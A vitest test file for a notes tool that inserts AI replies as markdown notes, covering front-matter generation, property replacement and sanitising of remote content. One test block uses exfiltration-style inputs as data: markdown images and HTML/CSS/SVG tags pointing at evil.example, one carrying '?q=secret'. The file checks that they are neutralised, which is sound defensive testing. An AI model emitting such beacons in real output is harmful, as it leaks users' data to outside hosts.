import { describe, expect, it } from "vitest";
import { loadProperties } from "../properties/loader";
import { generatedNote, propertiesReply } from "../recipes/output";

const props = await loadProperties();
const meta = { name: "Weekly review", now: new Date(2026, 10, 12, 9, 5), outputRelative: "Reviews/2026-W46.md", sourceRelatives: ["a.md"] };
const INVALID = { error: "The AI reply was not valid properties." };

describe("generatedNote", () => {
  it("adds the generated properties before the reply", () => {
    const text = generatedNote("# Week\nbody", meta, props);
    const read = props.readProperties(text);
    expect(read?.ok && read.props).toEqual({ generated_by: "Weekly review", generated_at: "2026-11-12T09:05", sources: ["../a.md"] });
    expect(text.endsWith("---\n# Week\nbody")).toBe(true);
  });

  it("unwraps a fenced reply", () => {
    expect(generatedNote("```markdown\n# Week\nbody\n```", meta, props).endsWith("---\n# Week\nbody")).toBe(true);
  });

  it("keeps the reply's other properties", () => {
    const text = generatedNote("---\ntitle: Week 46\ngenerated_by: me\n---\n# Week", meta, props);
    const read = props.readProperties(text);
    expect(read?.ok && read.props).toEqual({ title: "Week 46", generated_by: "Weekly review", generated_at: "2026-11-12T09:05", sources: ["../a.md"] });
  });
});

describe("generatedNote and remote content", () => {
  const body = (reply: string) => { const text = generatedNote(reply, meta, props); return text.slice(props.findFrontMatter(text)?.end ?? 0); };

  it("turns remote images into plain links", () => {
    expect(body("![x](https://evil.example/?q=secret)")).toBe("[x](https://evil.example/?q=secret)");
    expect(body("![x]( <//evil.example/a.png> )")).toBe("[x]( <//evil.example/a.png> )");
    expect(body("![x][ref]\n\n[ref]: https://evil.example/a.png")).toBe("[x][ref]\n\n[ref]: https://evil.example/a.png");
    expect(body("![ref]\n\n[ref]: https://evil.example/a.png")).toBe("[ref]\n\n[ref]: https://evil.example/a.png");
  });

  it("keeps local images", () => {
    expect(body("![chart](assets/chart.png)")).toBe("![chart](assets/chart.png)");
  });

  it("escapes HTML that can load a remote resource", () => {
    expect(body('<img src="https://evil.example/a.png">')).toBe('&lt;img src="https://evil.example/a.png">');
    expect(body('<IMG SRC=https://evil.example/a.png>')).toBe("&lt;IMG SRC=https://evil.example/a.png>");
    expect(body('<div style="background:url(https://evil.example/a)">x</div>')).toBe('&lt;div style="background:url(https://evil.example/a)">x</div>');
    expect(body('<svg><image href="https://evil.example/a"/></svg>')).toBe('&lt;svg>&lt;image href="https://evil.example/a"/></svg>');
    expect(body("<details><summary>More</summary>text</details>")).toBe("<details><summary>More</summary>text</details>");
  });
});

describe("propertiesReply", () => {
  const note = "---\ntitle: A\n---\nBody\n";
  const expected = { text: "---\ntitle: B\ntags: [x]\n---\nBody\n" };

  it("replaces the front matter and keeps the body", () => {
    expect(propertiesReply("title: B\ntags: [x]", note, props)).toEqual(expected);
  });

  it("strips a fence and --- lines", () => {
    expect(propertiesReply("```yaml\ntitle: B\ntags: [x]\n```", note, props)).toEqual(expected);
    expect(propertiesReply("---\ntitle: B\ntags: [x]\n---\n", note, props)).toEqual(expected);
  });

  it("refuses invalid YAML, a body or a scalar", () => {
    expect(propertiesReply("title: [\n", note, props)).toEqual(INVALID);
    expect(propertiesReply("title: B\n---\nNew body", note, props)).toEqual(INVALID);
    expect(propertiesReply("---\ntitle: B\n---\nNew body", note, props)).toEqual(INVALID);
    expect(propertiesReply("hello", note, props)).toEqual(INVALID);
    expect(propertiesReply("", note, props)).toEqual(INVALID);
  });

  it("adds front matter to a note without it", () => {
    expect(propertiesReply("title: B", "Body\n", props)).toEqual({ text: "---\ntitle: B\n---\nBody\n" });
  });
});
